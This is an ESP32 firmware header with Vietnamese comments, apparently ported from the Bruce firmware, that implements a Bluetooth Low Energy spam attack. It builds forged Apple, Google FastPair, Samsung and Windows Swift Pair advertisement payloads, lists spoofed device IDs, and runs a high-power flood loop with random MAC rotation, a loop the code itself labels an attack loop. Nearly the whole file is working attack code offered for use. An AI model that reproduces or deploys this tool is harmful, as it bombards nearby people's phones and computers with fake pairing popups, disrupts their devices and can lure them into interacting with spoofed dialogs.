#pragma once
/*
 * ================================================================
 *  BLE SPAM BRUCE — Port từ Bruce Firmware (Bluedroid version)
 * ================================================================
 *  Dùng built-in ESP32 BLE (Bluedroid), không cần NimBLE-Arduino
 *  để tránh xung đột với scan.hpp và utils.hpp hiện tại.
 *
 *  MAC rotation: esp_ble_gap_set_rand_addr() (Bluedroid GAP API)
 *  TX power:     esp_ble_tx_power_set()
 *  PRNG:         xorshift64* (Doominator1)
 * ================================================================
 */

#include "utils.hpp"          // BLEDevice.h, BLEAdvertising.h (built-in)
#include "../ui/phantom_ui.hpp"
#include <BLEDevice.h>
#include <BLEAdvertising.h>
#include <Preferences.h>
#include "esp_gap_ble_api.h"
#include "esp_task_wdt.h"
#include "esp_mac.h"

#if defined(CONFIG_IDF_TARGET_ESP32C3)
  #define BLE_MAX_TX ESP_PWR_LVL_P21
#else
  #define BLE_MAX_TX ESP_PWR_LVL_P9
#endif

// ================================================================
//  DATA: Apple ProximityPair
// ================================================================
struct AppleProxDev { const char* name; uint16_t id; };
static const AppleProxDev APPLE_PROX[] = {
    {"AirPods Pro",           0x0E20},{"AirPods Pro 2",        0x1420},
    {"AirPods Pro 2 USB-C",   0x2420},{"AirPods 4 ANC",        0x2820},
    {"AirPods 4",             0x2920},{"AirPods Max",           0x0A20},
    {"AirPods Max USB-C",     0x2B20},{"AirPods",               0x0220},
    {"AirPods 2nd Gen",       0x0F20},{"AirPods 3rd Gen",       0x1320},
    {"AirTag",                0x0055},{"Hermes AirTag",         0x0030},
    {"Beats Powerbeats Pro",  0x0B20},{"Beats Powerbeats Pro2", 0x2C20},
    {"Beats Solo 3",          0x0620},{"Beats Solo Pro",        0x0C20},
    {"Beats Solo 4",          0x2520},{"Beats Solo Buds",       0x2620},
    {"Beats Studio Buds",     0x1120},{"Beats Studio Buds+",    0x1620},
    {"Beats Studio 3",        0x0920},{"Beats Studio Pro",      0x1720},
    {"Beats Flex",            0x1020},{"Beats X",               0x0520},
    {"Beats Fit Pro",         0x1220},{"Powerbeats 3",          0x0320},
    {"Powerbeats Fit",        0x2F20},
};
static const int APPLE_PROX_COUNT = sizeof(APPLE_PROX)/sizeof(APPLE_PROX[0]);

// Apple NearbyAction codes
static const uint8_t APPLE_NA_ACTIONS[] = {
    0x13,0x24,0x05,0x27,0x20,0x19,0x1E,0x09,0x2F,0x02,0x0B,0x01,0x06,0x0D,0x2B
};
static const int APPLE_NA_COUNT = sizeof(APPLE_NA_ACTIONS);

// Apple Action Modal names
static const char* APPLE_ACTION_NAMES[] = {
    "Apple TV Setup","Setup New Phone","Transfer Number",
    "TV Color Balance","Apple Vision Pro","Apple TV Connecting",
    "Apple TV Audio Sync","Setup New Apple TV","HomePod Setup",
    "HomeKit Apple TV","Pair Apple TV","Setup New iPad",
};
static const int APPLE_ACTION_COUNT = sizeof(APPLE_ACTION_NAMES)/sizeof(char*);

// ================================================================
//  DATA: Google FastPair (80+ model)
// ================================================================
static const uint32_t GOOGLE_FP_MODELS[] = {
    0x0001F0,0x000047,0x470000,0x00000A,0x0A0000,0x00000B,0x0B0000,0x00000D,
    0x000007,0x070000,0x000009,0x090000,0x000048,0x001000,0x00B727,0x01E5CE,
    0x0200F0,0x00F7D4,0xF00002,0xF00400,0x1E89A7,0x0577B1,0x05A9BC,0xCD8256,
    0x0000F0,0xF00000,0x821F66,0xF52494,0x718FA4,0x0002F0,0x92BBBD,0x000006,
    0x060000,0xD446A7,0x2D7A23,0x038B91,0x02F637,0x02D886,0xF00001,0xF00201,
    0xF00209,0xF00205,0xF00305,0xF00E97,0x04ACFC,0x04AA91,0x04AFB8,0x05A963,
    0x05AA91,0x05C452,0x05C95C,0x0602F0,0x0603F0,0x1E8B18,0x1E955B,0x06AE20,
    0x06C197,0x06C95C,0x06D8FC,0x0744B6,0x07A41C,0x07C95C,0x07F426,0x0102F0,
    0x054B2D,0x0660D7,0x0103F0,0x0903F0,0x9ADB11,0x8B66AB,0xD99CA1,0x77FF67,
    0xAA187F,0xDCE9EA,0x87B25F,0x1448C9,0x13B39D,0x7C6CDB,0x005EF9,0xE2106F,
    0xB37A62,0x92ADC9
};
static const int GOOGLE_FP_COUNT = sizeof(GOOGLE_FP_MODELS)/sizeof(uint32_t);

// ================================================================
//  DATA: Samsung Galaxy
// ================================================================
static const uint8_t SAMSUNG_WATCH[] = {
    0x1A,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0A,0x0B,
    0x0C,0x11,0x12,0x13,0x14,0x15,0x16,0x17,0x18,0x1B,0x1C,0x1D,
    0x1E,0x20,0x21,0x22,0x23,0x24,0x25,0x26,0x27,0x28,0x29,0x2A,
    0x30,0x31,0x32,0x33,0x34,0x35,0x40,0x41,0x42,0x60,0x61,0x62,
};
static const int SAMSUNG_WATCH_COUNT = sizeof(SAMSUNG_WATCH);

static const uint32_t SAMSUNG_BUDS[] = {
    0xEE7A0C,0x9D1700,0x39EA48,0xA7C62C,0x850116,0x3D8F41,0x3B6D02,0xAE063C,
    0xB8B905,0xEAAA17,0xD30704,0x9DB006,0x101F1A,0x859608,0x8E4503,0x2C6740,
    0x3F6718,0x42C519,0xAE073A,0x011716,0x123456,0x654321,0x789ABC,0xDEF123,
};
static const int SAMSUNG_BUDS_COUNT = sizeof(SAMSUNG_BUDS)/sizeof(uint32_t);

// Samsung OUI (rút gọn)
static const char* SAMSUNG_OUIS[] = {
    "00:02:78","00:21:19","20:64:32","38:AA:3C","50:CC:F8","5C:0A:5B",
    "78:D6:F0","84:0B:2D","90:18:7C","98:0C:82","A0:0B:BA","A8:CA:B9",
    "B4:07:F9","CC:3A:61","DC:71:44","FC:1F:19","04:D6:AA","08:C5:E1",
    "14:49:E0","24:18:1D","28:C2:1F","34:23:BA","40:0E:85","54:88:0E",
};
static const int SAMSUNG_OUI_COUNT = sizeof(SAMSUNG_OUIS)/sizeof(char*);

static const char* WIN_SWIFT_PRESETS[] = {
    "Generic Swift Pair","Never Gonna Give You Up",
    "Bill Nye's iPhone","FBI Surveillance Van",
    "Skibidi Toilet","67",
};
static const int WIN_SWIFT_COUNT = sizeof(WIN_SWIFT_PRESETS)/sizeof(char*);

static const char* BEACON_PRESETS[] = {
    "NeverGonnaGiveYouUp","Bill Nye iPhone",
    "FBI_SURVEILLANCE","Skibidi_Toilet",
};
static const int BEACON_PRESET_COUNT = sizeof(BEACON_PRESETS)/sizeof(char*);

// ================================================================
//  ENUM & CONFIG
// ================================================================
enum BleSpamType {
    BST_APPLE_PAIR=0, BST_APPLE_ACTION, BST_APPLE_NOT_YOURS,
    BST_ANDROID, BST_WINDOWS, BST_SAMSUNG, BST_BEACON,
    BST_RANDOM_ALL, BST_COUNT
};
static const char* BST_NAMES[] = {
    "Apple Pairing","Apple Action","Apple Not Yours",
    "Android Alert","Windows Swift","Samsung Spam",
    "BLE Beacon","Random Tat Ca",
};

enum BleTxPwr  { BTP_MAX=0, BTP_HIGH, BTP_MED, BTP_LOW };
static const char* BTP_LABELS[] = {"MAX","CAO","VUA","THAP"};

enum BleMacMode { BMM_OFF=0,BMM_EVERY,BMM_2,BMM_5,BMM_10,BMM_25,BMM_COUNT };
static const char* BMM_LABELS[] = {"Tat","Moi goi","Moi 2","Moi 5","Moi 10","Moi 25"};

struct BleSpamCfg { uint32_t adv_ms=5; uint32_t gap_ms=5;
                    BleTxPwr tx=BTP_MAX; BleMacMode mac_mode=BMM_EVERY; };
static BleSpamCfg ble_cfg;

static void BleSpam_LoadCfg() {
    Preferences p; if (!p.begin("ble_spam",true)) return;
    ble_cfg.adv_ms=(p.getUInt("adv",5));
    ble_cfg.gap_ms=(p.getUInt("gap",5));
    ble_cfg.tx=(BleTxPwr)(p.getUChar("tx",0));
    ble_cfg.mac_mode=(BleMacMode)(p.getUChar("mac",1));
    p.end();
}
static void BleSpam_SaveCfg() {
    Preferences p; if (!p.begin("ble_spam",false)) return;
    p.putUInt("adv",ble_cfg.adv_ms); p.putUInt("gap",ble_cfg.gap_ms);
    p.putUChar("tx",(uint8_t)ble_cfg.tx); p.putUChar("mac",(uint8_t)ble_cfg.mac_mode);
    p.end();
}

// ================================================================
//  PRNG xorshift64* — tốc độ cao (Doominator1)
// ================================================================
static uint64_t _rng = 0;
static void     RngSeed() { _rng=((uint64_t)esp_random()<<32)^esp_random(); if(!_rng)_rng=0x9E3779B97F4A7C15ULL; }
static uint64_t Rng64()   { if(!_rng)RngSeed(); uint64_t x=_rng; x^=x>>12; x^=x<<25; x^=x>>27; _rng=x; return x*0x2545F4914F6CDD1DULL; }
static void     RandMac(uint8_t* m) { uint64_t r=Rng64(); for(int i=0;i<6;i++)m[i]=(uint8_t)(r>>(i*8)); m[0]=(m[0]&0xFE)|0x02; }

static bool IsSamsung(const uint8_t* mac) {
    char buf[9]; snprintf(buf,9,"%02X:%02X:%02X",mac[0],mac[1],mac[2]);
    for(int i=0;i<SAMSUNG_OUI_COUNT;i++) if(!strcmp(buf,SAMSUNG_OUIS[i])) return true;
    return false;
}

// ================================================================
//  TX POWER (Bluedroid)
// ================================================================
static esp_power_level_t TxLevel(BleTxPwr t) {
    switch(t){case BTP_MAX:return BLE_MAX_TX; case BTP_HIGH:return ESP_PWR_LVL_P9;
              case BTP_MED:return ESP_PWR_LVL_P6; default:return ESP_PWR_LVL_P3;}
}
static void ApplyTxPwr(BleTxPwr t){ esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV,TxLevel(t)); }

// ================================================================
//  MAC ROTATION — Bluedroid GAP API (không restart stack)
// ================================================================
static BLEAdvertising* pBrAdv = nullptr;

static void RotateMac(const uint8_t* mac) {
    if (pBrAdv) pBrAdv->stop();
    // Bluedroid: đặt random address qua GAP
    uint8_t addr[6];
    memcpy(addr, mac, 6);
    addr[5] |= 0xC0;  // random static address: 2 bit cao = 11
    esp_ble_gap_set_rand_addr(addr);
    delay(3);
}

// ================================================================
//  PAYLOAD BUILDERS — dùng BLEAdvertisementData (built-in)
// ================================================================

static bool BuildAppleProxPair(uint8_t prefix, uint16_t devId, BLEAdvertisementData& d) {
    uint8_t buf[31]; uint8_t i=0;
    buf[i++]=0x1E; buf[i++]=0xFF; buf[i++]=0x4C; buf[i++]=0x00;
    buf[i++]=0x07; buf[i++]=0x19; buf[i++]=prefix;
    buf[i++]=(devId>>8)&0xFF; buf[i++]=devId&0xFF;
    buf[i++]=0x55; esp_fill_random(&buf[i],3); i+=3;
    buf[i++]=0x00; buf[i++]=0x00;
    esp_fill_random(&buf[i],16); i+=16;
    d=BLEAdvertisementData();
    d.addData(std::string((char*)buf,i));
    return true;
}

static bool BuildAppleAction(BLEAdvertisementData& d) {
    uint8_t buf[11]; uint8_t i=0;
    uint8_t act=APPLE_NA_ACTIONS[Rng64()%APPLE_NA_COUNT];
    uint8_t flags=0xC0;
    if(act==0x20&&(Rng64()%2))flags--;
    if(act==0x09&&(Rng64()%2))flags=0x40;
    buf[i++]=10; buf[i++]=0xFF; buf[i++]=0x4C; buf[i++]=0x00;
    buf[i++]=0x0F; buf[i++]=5; buf[i++]=flags; buf[i++]=act;
    esp_fill_random(&buf[i],3); i+=3;
    d=BLEAdvertisementData(); d.setFlags(0x06);
    d.addData(std::string((char*)buf,i));
    return true;
}

static bool BuildAndroid(BLEAdvertisementData& d) {
    uint32_t m=GOOGLE_FP_MODELS[Rng64()%GOOGLE_FP_COUNT];
    uint8_t buf[14]={0x03,0x03,0x2C,0xFE,0x06,0x16,0x2C,0xFE,
        (uint8_t)((m>>16)&0xFF),(uint8_t)((m>>8)&0xFF),(uint8_t)(m&0xFF),
        0x02,0x0A,(uint8_t)((Rng64()%120)-100)};
    d=BLEAdvertisementData();
    d.addData(std::string((char*)buf,14));
    return true;
}

static bool BuildSamsungWatch(BLEAdvertisementData& d) {
    uint8_t model=SAMSUNG_WATCH[Rng64()%SAMSUNG_WATCH_COUNT];
    uint8_t buf[15]={0x0E,0xFF,0x75,0x00,0x01,0x00,0x02,0x00,
                     0x01,0x01,0xFF,0x00,0x00,0x43,model};
    d=BLEAdvertisementData(); d.setFlags(0x06);
    d.addData(std::string((char*)buf,15));
    return true;
}

static bool BuildSamsungBuds(BLEAdvertisementData& d) {
    uint32_t m=SAMSUNG_BUDS[Rng64()%SAMSUNG_BUDS_COUNT];
    uint8_t buf[31]; uint8_t bi=0;
    buf[bi++]=27;    buf[bi++]=0xFF; buf[bi++]=0x75; buf[bi++]=0x00;
    buf[bi++]=0x42;  buf[bi++]=0x09; buf[bi++]=0x81; buf[bi++]=0x02;
    buf[bi++]=0x14;  buf[bi++]=0x15; buf[bi++]=0x03; buf[bi++]=0x21;
    buf[bi++]=0x01;  buf[bi++]=0x09;
    buf[bi++]=(m>>16)&0xFF; buf[bi++]=(m>>8)&0xFF;
    buf[bi++]=0x01;  buf[bi++]=m&0xFF;
    buf[bi++]=0x06;  buf[bi++]=0x3C; buf[bi++]=0x94; buf[bi++]=0x8E;
    buf[bi++]=0x00;  buf[bi++]=0x00; buf[bi++]=0x00; buf[bi++]=0x00;
    buf[bi++]=0xC7;  buf[bi++]=0x00;
    buf[bi++]=0x10;  buf[bi++]=0xFF; buf[bi++]=0x75;
    d=BLEAdvertisementData();
    d.addData(std::string((char*)buf,bi));
    return true;
}

static bool BuildWindows(const char* name, BLEAdvertisementData& d) {
    uint8_t nl=strlen(name); if(nl>21)nl=21;
    uint8_t buf[30]; uint8_t i=0;
    buf[i++]=6+nl; buf[i++]=0xFF;
    buf[i++]=0x06; buf[i++]=0x00;
    buf[i++]=0x03; buf[i++]=0x00; buf[i++]=0x80;
    memcpy(buf+i,name,nl); i+=nl;
    d=BLEAdvertisementData(); d.setFlags(0x06);
    d.addData(std::string((char*)buf,i));
    return true;
}

static bool BuildBeacon(const char* name, BLEAdvertisementData& d) {
    uint8_t buf[31]; uint8_t i=0;
    buf[i++]=0x02; buf[i++]=0x01; buf[i++]=0x06;
    buf[i++]=0x03; buf[i++]=0x03; buf[i++]=0x12; buf[i++]=0x18;
    buf[i++]=0x03; buf[i++]=0x19; buf[i++]=0x80; buf[i++]=0x01;
    uint8_t nl=strlen(name); if(nl>18)nl=18;
    buf[i++]=nl+1; buf[i++]=0x09;
    memcpy(buf+i,name,nl); i+=nl;
    d=BLEAdvertisementData();
    d.addData(std::string((char*)buf,i));
    return true;
}

// ================================================================
//  VÒNG LẶP TẤN CÔNG CHÍNH
// ================================================================
static void BleSpam_RunLoop(BleSpamType type, int dev_idx=0,
                             const char* extra_name=nullptr)
{
    BLEDevice::init("");
    delay(10);
    ApplyTxPwr(ble_cfg.tx);
    pBrAdv = BLEDevice::getAdvertising();
    if (pBrAdv) { pBrAdv->setMinInterval(0x20); pBrAdv->setMaxInterval(0x30); }
    RngSeed();

    PhUI_Status(BST_NAMES[type],"Dang chuan bi...",nullptr,nullptr,"CTR=Dung");
    HaltTillRelease(BUTTON_CENTER);
    delay(300);

    uint32_t pkt_total=0, pkt_window=0, win_start=millis(), last_ui=millis(), pkt_count=0;
    float pkt_s=0.0f;
    bool blink=false;
    char rnd_name[17];

    while (!ReadButton(BUTTON_CENTER)) {
        // Chọn type thực tế (RANDOM_ALL)
        BleSpamType cur = (type==BST_RANDOM_ALL)
                          ? (BleSpamType)(Rng64()%(BST_COUNT-1))
                          : type;
        int cur_dev = (type==BST_RANDOM_ALL) ? (int)(Rng64()%8) : dev_idx;

        // MAC rotation
        uint32_t div=0;
        switch(ble_cfg.mac_mode){
            case BMM_EVERY:div=1;break; case BMM_2:div=2;break;
            case BMM_5:div=5;break;   case BMM_10:div=10;break;
            case BMM_25:div=25;break;  default:div=0;break;
        }
        if(div>0 && (pkt_count==0 || pkt_count%div==0)){
            uint8_t mac[6]; RandMac(mac); RotateMac(mac);
        }

        // Build payload
        BLEAdvertisementData adv;
        bool ok=false;
        switch(cur){
            case BST_APPLE_PAIR:
                ok=BuildAppleProxPair(0x07, APPLE_PROX[cur_dev%APPLE_PROX_COUNT].id, adv);
                break;
            case BST_APPLE_ACTION:
                ok=BuildAppleAction(adv);
                break;
            case BST_APPLE_NOT_YOURS:
                ok=BuildAppleProxPair(0x01, APPLE_PROX[cur_dev%APPLE_PROX_COUNT].id, adv);
                break;
            case BST_ANDROID: {
                uint8_t mac[6]; RandMac(mac);
                if(IsSamsung(mac)&&(Rng64()%2))
                    ok=(Rng64()%2)?BuildSamsungWatch(adv):BuildSamsungBuds(adv);
                else ok=BuildAndroid(adv);
                break;
            }
            case BST_WINDOWS: {
                const char* nm = extra_name
                    ? extra_name
                    : WIN_SWIFT_PRESETS[cur_dev%WIN_SWIFT_COUNT];
                ok=BuildWindows(nm,adv);
                break;
            }
            case BST_SAMSUNG:
                ok=(Rng64()%2)?BuildSamsungBuds(adv):BuildSamsungWatch(adv);
                break;
            case BST_BEACON: {
                // Fix lỗi 3: dùng if/else thay ternary phức tạp
                const char* nm;
                if(extra_name) {
                    nm = extra_name;
                } else if(cur_dev < BEACON_PRESET_COUNT) {
                    nm = BEACON_PRESETS[cur_dev];
                } else {
                    snprintf(rnd_name,17,"%08lX%08lX",(unsigned long)(Rng64()&0xFFFFFFFF),(unsigned long)(Rng64()&0xFFFFFFFF));
                    nm = rnd_name;
                }
                ok=BuildBeacon(nm,adv);
                break;
            }
            default: ok=BuildAndroid(adv); break;
        }

        // Phát sóng
        if(ok && pBrAdv) {
            BLEAdvertisementData scan_rsp;
            pBrAdv->setAdvertisementData(adv);
            pBrAdv->setScanResponseData(scan_rsp);
            pBrAdv->start();
            delay(ble_cfg.adv_ms);
            pBrAdv->stop();
            delay(ble_cfg.gap_ms);
            pkt_total++; pkt_window++; pkt_count++;
        }

        // Stats
        uint32_t now=millis();
        if(now-win_start>=500){ pkt_s=pkt_window*2.0f; pkt_window=0; win_start=now; }

        // UI update mỗi 800ms
        if(now-last_ui>=800) {
            blink=!blink;
            char l1[28],l2[28],l3[28];
            BleSpamType show = (type==BST_RANDOM_ALL)?cur:type;
            snprintf(l1,28,"Gui: %lu %s",(unsigned long)pkt_total,blink?"*":" ");
            snprintf(l2,28,"Pkt/s: %.1f",pkt_s);
            snprintf(l3,28,"TX:%s MAC:%s",BTP_LABELS[ble_cfg.tx],BMM_LABELS[ble_cfg.mac_mode]);
            PhUI_Status(BST_NAMES[show],l1,l2,l3,"CTR=Dung");
            last_ui=now;
        }
        esp_task_wdt_reset();
    }

    HaltTillRelease(BUTTON_CENTER);
    if(pBrAdv){ pBrAdv->stop(); pBrAdv=nullptr; }
    BLEDevice::deinit();
    PhUI_Result(BST_NAMES[type],pkt_total,"Goi da gui",true);
}

// ================================================================
//  MENU CẤU HÌNH
// ================================================================
static void BleSpam_ConfigMenu(BleSpamType type, int dev_idx=0,
                                const char* extra_name=nullptr)
{
    int sel=0;
    HaltTillRelease(BUTTON_CENTER);
    while(true){
        display.clearDisplay();
        PhUI_Header("Cai Dat Spam");
        display.setTextSize(1); display.setTextColor(WHITE);
        display.setCursor(3,13); char th[22]; snprintf(th,22,"> %s",BST_NAMES[type]); display.print(th);

        // TX
        if(sel==0){display.fillRect(0,24,128,11,WHITE);display.setTextColor(BLACK);}
        else display.setTextColor(WHITE);
        display.setCursor(3,26); display.print("TX: "); display.print(BTP_LABELS[ble_cfg.tx]);
        display.setTextColor(WHITE);

        // MAC
        if(sel==1){display.fillRect(0,35,128,11,WHITE);display.setTextColor(BLACK);}
        else display.setTextColor(WHITE);
        display.setCursor(3,37); display.print("MAC: "); display.print(BMM_LABELS[ble_cfg.mac_mode]);
        display.setTextColor(WHITE);

        // Start
        if(sel==2){display.fillRect(0,46,128,11,WHITE);display.setTextColor(BLACK);}
        else display.setTextColor(WHITE);
        display.setCursor(3,48); display.print(sel==2?"> [Bat dau]":"  [Bat dau]");
        display.setTextColor(WHITE);

        PhUI_Footer("Len/Giam","OK","Xuong/Tang");
        display.display();

        while(true){
            if(ReadButton(BUTTON_LEFT)){
                HaltTillRelease(BUTTON_LEFT);
                if(sel==0)ble_cfg.tx=(BleTxPwr)((ble_cfg.tx+3)%4);
                else if(sel==1)ble_cfg.mac_mode=(BleMacMode)((ble_cfg.mac_mode+BMM_COUNT-1)%BMM_COUNT);
                else sel=(sel+2)%3;
                break;
            }
            if(ReadButton(BUTTON_RIGHT)){
                HaltTillRelease(BUTTON_RIGHT);
                if(sel==0)ble_cfg.tx=(BleTxPwr)((ble_cfg.tx+1)%4);
                else if(sel==1)ble_cfg.mac_mode=(BleMacMode)((ble_cfg.mac_mode+1)%BMM_COUNT);
                else sel=(sel+1)%3;
                break;
            }
            if(ReadButton(BUTTON_CENTER)){
                HaltTillRelease(BUTTON_CENTER);
                if(sel==2){ BleSpam_SaveCfg(); BleSpam_RunLoop(type,dev_idx,extra_name); return; }
                sel=(sel+1)%3;
                break;
            }
            delay(25);
        }
    }
}

// ================================================================
//  MENU CHỌN THIẾT BỊ
// ================================================================
static void BleSpam_DeviceMenu(BleSpamType type)
{
    std::vector<String> items;
    switch(type){
        case BST_APPLE_PAIR: case BST_APPLE_NOT_YOURS:
            for(int i=0;i<APPLE_PROX_COUNT;i++) items.push_back(APPLE_PROX[i].name);
            items.push_back("Random Tat Ca"); break;
        case BST_APPLE_ACTION:
            for(int i=0;i<APPLE_ACTION_COUNT;i++) items.push_back(APPLE_ACTION_NAMES[i]);
            items.push_back("Random Tat Ca"); break;
        case BST_ANDROID:
            items.push_back("Google FastPair");
            items.push_back("Smart Samsung+Google"); break;
        case BST_WINDOWS:
            for(int i=0;i<WIN_SWIFT_COUNT;i++) items.push_back(WIN_SWIFT_PRESETS[i]);
            items.push_back("Random Tat Ca"); break;
        case BST_SAMSUNG:
            items.push_back("Galaxy Watch");
            items.push_back("Galaxy Buds");
            items.push_back("Random Watch+Buds"); break;
        case BST_BEACON:
            for(int i=0;i<BEACON_PRESET_COUNT;i++) items.push_back(BEACON_PRESETS[i]);
            items.push_back("Ten Ngau Nhien"); break;
        default: break;
    }
    if(items.empty()){ BleSpam_ConfigMenu(type,0); return; }
    int sel=PhUI_Select(BST_NAMES[type],items);
    if(sel<0) return;
    BleSpam_ConfigMenu(type,sel);
}

// ================================================================
//  ENTRY POINT
// ================================================================
void BLE_SpamBruce()
{
    BleSpam_LoadCfg();
    std::vector<String> types;
    for(int i=0;i<BST_COUNT;i++) types.push_back(BST_NAMES[i]);
    while(true){
        int sel=PhUI_Select("Spam Bluetooth",types);
        if(sel<0) return;
        BleSpamType t=(BleSpamType)sel;
        if(t==BST_RANDOM_ALL) BleSpam_ConfigMenu(t,0);
        else BleSpam_DeviceMenu(t);
    }
}

